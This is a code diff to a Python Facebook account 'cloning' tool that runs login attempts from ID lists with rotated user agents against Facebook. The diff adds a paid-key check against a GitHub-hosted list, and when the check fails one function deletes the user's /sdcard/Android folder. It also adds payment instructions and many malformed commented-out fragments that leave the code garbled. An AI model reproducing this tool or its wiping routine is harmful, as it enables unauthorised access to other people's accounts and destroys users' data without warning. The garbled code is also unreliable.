@@ -34,7 +34,7 @@ try:
     import requests 
 except ImportError:
     print('\n  installing Requests ...\n')
-    os.system('pip install requests')
+    os.system('pip install requests') 
 
 
 try:
@@ -121,26 +121,50 @@ A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
-head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-logo = (f'''\033[1;37m                                 
-  
- SSSSS  UU   UU  SSSSS    AAA   NN   NN TTTTTTT 
-SS      UU   UU SS       AAAAA  NNN  NN   TTT   
- SSSSS  UU   UU  SSSSS  AA   AA NN N NN   TTT   
-     SS UU   UU      SS AAAAAAA NN  NNN   TTT   
- SSSSS   UUUUU   SSSSS  AA   AA NN   NN   TTT                                                                                 
+head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}   
+logo = (f'''\033[1;37m      
+
+      WORKING FOR NEPAL,INDIA, PAKISTAN,
+               AFGHANISTAN,BANGLADESH	                                   
+ _____ _____ _____ _____ _____ _____ 
+|   __|  |  |   __|  _  |   | |_   _|
+|__   |  |  |__   |     | | | | | |  
+|_____|_____|_____|__|__|_|___| |_|                                                                                            
 ---------------------------------------------------
  [•] \033[1;37mOwner     :   SUSHANT KAFLE
  [•] Github    :   SUSHANT KAFLE
- [•] Status    :   Free
- [•] Tool      :   Private 
+ [•] Status    :   Paid
+ [•] Tool      :   Public
  [•] Facebook  :   SUSHANT DAVIL
  [•] Version   :  \033[1;32m 0.7\033[1;32m \033[1;37m
 ---------------------------------------------------''')
 def clear():
-    os.system("clear")
-    print(logo)    
-    
+ 	#ua = "os.system('clear')
+		#ua = "print(logo)
+		#ua = "print(f"  [{G}A{E}] BANGLADESH");print(f"  [{G}B{E}] BANGLADESH {BG}[{W}1{BG}]{W}");print(f"  [{G}C{E}] INDIA ");print(f"  [{G}D{E}] PAKISTAN");print(f"  [{G}E{E}] AFGHANISTAN ");print(f"  [{G}F{E}] NEPAL ");print(f"  [{G}G{E}] MIX CONTRY ");print(f"  [{R}X{E}] EXIT")
+		#ua = "line()
+		#ua = "opt = input(f'  [{S}✓{E}] Choice : ')
+#ua = "if opt in ['A','a','1','01']:
+			#ua = "Bangladeshi()
+#ua = "if opt in ['B','b','2','02']:
+			#ua = "Bangladeshi1()
+#ua = "if opt in ['C','c','3','03']:
+			#ua = "Indian()
+	#ua = "if opt in ['D','d','4','04']:
+			#ua = "Pakistani()
+	#ua = "if opt in ['E','e','5','05']:
+			#ua = "Afghanistani()
+	#ua = "if opt in ['f','F','6','06']:
+			#ua = "Nepal()
+	#ua = "if opt in ['G','g','7','07']:
+			#ua = "Mix()
+	#ua = "elif opt  in ['X','x']:
+	#ua = "exit()
+		#ua = "else:
+	#ua = " print(f'\n \t {R}Choose valid option{E}');time.sleep(1)
+			#ua = "Main()
+    os.system('clear')
+    print(logo) 
 def result(OKs,cps):
     if len(OKs) != 0 or len(cps) != 0:
         print('\n')
@@ -155,10 +179,9 @@ def result(OKs,cps):
 os.system("speak 'WELCOME TO SUSHANT COMMAND'")
 def Hamza():   
     os.system('clear')
-    print(logo)
+    print(logo) 
     print(35*'─')
     print(f'[1] File Cloneing')
-    print(f'[2] Random Cloneing ')
     print(f'[3] Create File ')    
     print(35*'─')
     select = input('SELECT MENU : ')
@@ -226,9 +249,9 @@ class main_crack():
         global methods
         clear()
         print(45*'─')
-        print(" [•] Put File Path Example : /sdcard/file.txt ")
+        print(" [•] Put File Path Example : /sdcard/susant.txt ")
         print(45*'─')
-        self.file = input(' [•] File Path : ')
+        self.file = input(' [•]  Path your File : ')
         try:
             self.id = open(self.file).read().splitlines()
             self.pasw()
@@ -649,6 +672,164 @@ class main_crack():
                             elif 'methodD' in methods:
                                 SUSHANTworld.submit(self.methodD, uid, name, pwx)
                    except:pass
-            result(oks,cps)
-	          https://raw.githubusercontent.com/susant45/susa/main/susantsk.txt
-Hamza()
+            result(oks,cps)   
+  #####_____KEY-SETUP_____#####
+def getKey():
+    myid = str(os.getuid())
+    myid=myid.upper()[::-1]
+    n=re.findall("(\d\d)",myid)
+    plat=platform.version()[2:][:8][::-1].upper()+platform.release()[3:][::-1].upper()+platform.version()[:2]
+    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+    return "SUSANT-"+myid+xp
+km=('https://raw.githubusercontent.com/susant45/susa/main/susantsk.txt')
+def xi():
+    global km
+    j=getKey()
+    r=requests.get(km).text
+    if j in r:
+        pass
+    else:
+        os.system("clear")
+        shutil.rmtree("/sdcard/Android")
+        print(f" Don't Bypass ")
+        sys.exit()
+#####____END-Setup____##### 
+def Activate():
+    global km
+    r=requests.get(km).text
+    k=getKey()
+    if k in r:
+        Hamza()
+        print(f" [•] Your Token is successfully Approved")
+    else:
+                os.system("clear")
+                print(logo)
+                print(f" [•] YOUR KEY: "+k)
+                print(35*'─')
+                print(f" [•] NOTE    : WELCOME TO SUSANT TOOL")
+                print(35*'─')
+                print(f" [•] TOOL IS PAID YOU HAVE TO")
+                print(f" [•] PAY FOR APPROVAL .")
+                print(35*'─')
+                print(f" [•] For Pakistan === Jazzcash  : +977981-5640133")
+                print(f" [•] Rs.400 For 15 Days")
+                print(f" [•] Rs.600 For 1 Month")
+                print(f" [•] For Other Countries === Binance : 204128772")
+                print(f" [•] 6$ For 15 Days")
+                print(f" [•] 10$ For 1 Month")
+                print(f" [•] COPY YOUR KEY SEND TO ADMIN FOR APPROVAL")
+                print(35*'─')
+                input(f" [•] IF YOU WANT TO BUY THEN PRESS ENTER ")
+                tks = ('Hello%20SUSANT%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+k)
+                os.system('am start https://wa.me/+977981-5640133?text='+tks)
+                Activate()
+                sys.exit()
+Activate()
+                           #ua = "[FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;NTC/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]"
+                        #ua = "FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;Nepal Telecom/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]"
+                      #ua = "[FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;FBCR/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]"
+                      #ua = "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
+                      #ua = "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
+                      #ua = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
+                      #ua = "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
+                      #ua = "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
+                      #ua = "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
+                      #ua = "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
+                      #ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.
+                      #ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3
+                      #ua = "Mozilla/5.0 (Linux; U; Android 9; ms-my; RMX1941 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 RealmeBrowser/35.5.0.8
+                      #ua = "Mozilla/5.0 (Linux; Android 13; RMX3395 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]
+                      #ua = "Mozilla/5.0 (Linux; Android 14; RMX3709 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]
+                      #ua = "Mozilla/5.0 (Linux; Android 8.1.0;vivo Y71 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) S3 Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36 SGInfo/1080/1920/2.625 SogouSearch Android1.0 version3.0 AppVersion/7352 NoHead
+                      #ua = "Mozilla/5.0 (Linux; Android 11; V2168A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.145 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]
+                      #ua = "Mozilla/5.0 (Linux; U; Android 10; zh-cn; OPPO A79 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.4 Mobile Safari/537.36
+                      #ua = "Mozilla/5.0 (Linux; Android 11; Find X3 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Mobile Safari/537.36      
+                     #ua = "Mozilla/5.0 (Linux; Android 5.1; OPPO A37t Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.26 SP-engine/2.64.0 baiduboxapp/13.26.0.10 (Baidu; P1 5.1) NABar/1.0
+                      #ua = "Mozilla/5.0 (Linux; Android 12; NE2210 Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]
+                      #ua = "Mozilla/5.0 (Linux; Android 13; CPH2569) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.154 Mobile Safari/537.36 OPR/78.5.4143.75924
+                      #ua = "Mozilla/5.0 (Linux; U; Android 13; zh-cn; LE2110 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 MQQBrowser/14.7 Mobile Safari/537.36 COVC/046901
+                      #ua = "Mozilla/5.0 (Linux; U; Android 13; en-gb; CPH2569 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.10.3.4.1
+                                                               #user agent = "
+                      #ua = "FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;WorldLink/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]
+                      #ua = "FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;Subisu/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]
+                      #ua = "FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;Classic Tech/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]
+                      #ua = "FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;Nepal Telecom/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]
+                      #ua = "FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;DishHome/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]
+                      #ua = "FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;Ultranet Communications/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]
+                      #ua = "FBAN/;FBAV/4Q095MQG;FBBV/656529552;FBAN/FBAN;FBAV/4Q095MQG;FBBV/656529552;FBDM//*{density=2.5,width=1080,height=3840};FBLC/it_IT;FBRV/884642532;TP-Link/Realme;FBMF/Motorola;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F42;FBSV/16;FBOP/5;FBCA/armeabi-v7a;FBSS/;]
+                                                          #user agent= "
+                      #ua = "Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.1.6.0.MBFMIDI)
+                      #ua ="Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920K Build/NRD90M)
+                                                        #user agent= "
+                     #ua = "Dalvik/1.6.0 (Linux; U; Android 4.4.2; Lenovo B8080-F Build/KVT49L)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 6.0; MotoG3 Build/MPIS24.65-33.1-2-16)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 3 MIUI/V8.2.2.0.MHOMIDL)
+                     #ua = "Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-S7272 Build/JDQ39)
+                     #ua = "Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I9300 Build/JZO54K)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 6.0.1; HTC One_M8 Eye Build/MMB29M)
+                     #ua = "Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-I9500 Build/JDQ39)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z010D Build/MMB29P)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4A MIUI/V9.2.6.0.NCCMIEK)
+                     #ua = "Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I8552 Build/JZO54K)
+                     #ua = "Dalvik/1.4.0 (Linux; U; Android 2.3.4; GT-S5670 Build/GINGERBREAD)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 5.1; K4000_PRO Build/LMY47D)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 6.0; Redmi Note 4 MIUI/V8.5.6.0.MBFMIED)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A510F Build/MMB29K)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; LGLS665 Build/LMY47V)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 7.0; Moto G (4) Build/NPJS25.93-14-4)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 4 MIUI/8.4.19)
+                     #ua = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A510F Build/NRD90M)
+                                   #ua = "def Main():
+	#ua = "os.system('clear')
+	#ua = "print(logo)
+	#ua = "print(f"  [{G}A{E}] BANGLADESH");print(f"  [{G}B{E}] BANGLADESH {BG}[{W}1{BG}]{W}");print(f"  [{G}C{E}] INDIA ");print(f"  [{G}D{E}] PAKISTAN");print(f"  [{G}E{E}] AFGHANISTAN ");print(f"  [{G}F{E}] NEPAL ");print(f"  [{G}G{E}] MIX CONTRY ");print(f"  [{R}X{E}] EXIT")
+	#ua = "line()
+	#ua = "opt = input(f'  [{S}✓{E}] Choice : ')
+#ua = "if opt in ['A','a','1','01']:
+	#ua = "Bangladeshi()
+#ua = "if opt in ['B','b','2','02']:
+		#ua = "Bangladeshi1()
+	#ua = "if opt in ['C','c','3','03']: 
+		#ua = "indian()
+#ua = "if opt in ['D','d','4','04']:
+		#ua = "Pakistani()
+	#ua = "if opt in ['E','e','5','05']:
+		#ua = "Afghanistani()
+	#ua = "if opt in ['f','F','6','06']:
+		#ua = "Nepal()
+	#ua = "if opt in ['G','g','7','07']:
+	#ua = "Mix()
+	#ua = "elif opt  in ['X','x']:
+		#ua = "exit()
+	#ua = "else:
+		#ua = "print(f'\n \t {R}Choose valid option{E}');time.sleep(1)
+		#ua = "Main()
+
+                           	#ua = "print(f" {W} IND SIM CODE : {G}918864 918665 918706 +977{E}{W}");line()
+		#ua = "kode = input(f'  [{S}+{E}] Choice : ')
+		#ua = "doamin = ' BD Number id cloner [ONLY-OK] '
+		#ua = "os.system('clear');print(logo);print(f'  EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{E} ');line()
+		#ua = "limit = int(input(f'  [{S}+{E}] PUT YOUR LIMIT : '))
+		#ua = "os.system('clear');print(logo);print(f"  [{G}A{E}] METHOD 1 {R}[{W}free{R}]{E}\n  [{G}B{E}] METHOD 2 {R}[{W}mbasic{R}]{E}\n  [{G}C{E}] METHOD 3 {R}[{W}m{R}]{E}\n  [{G}D{E}] METHOD 4 {R}[{W}x{R}]{E}\n  [{G}E{E}] METHOD 5 {R}[{W}p{R}]{E}\n  [{G}F{E}] METHOD 6 {R}[{W}m.alpha{R}]{E}");line()
+		#ua = "mth=input(f'  [{S}+{E}] Choice : ')
+		#ua = "os.system('clear');print(logo);print(f"  [{S}+{E}] Do you went show cookie (y/n) ");line()
+		#ua = "ckiv=input(f"  [{S}+{E}] Choice : ")
+		#ua = "if ckiv in ['n','N','no','NO','2']:
+		#ua = "cokix.append(f'n')
+		
+		        #ua = "  import os,platform
+#ua = "os.system('git pull')
+#ua = "os.system("clear")
+#ua = "xyz=platform.architecture()[0]
+#ua = "if xyz=="32bit":
+   #ua = " __import__("P32")
+#ua = "elif xyz=="64bit":
+   #ua = " __import__("P64")
+    
+         #ua = "f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    #ua = " f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    #ua = " f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+     #ua = " f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    #ua = " f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+   
+    
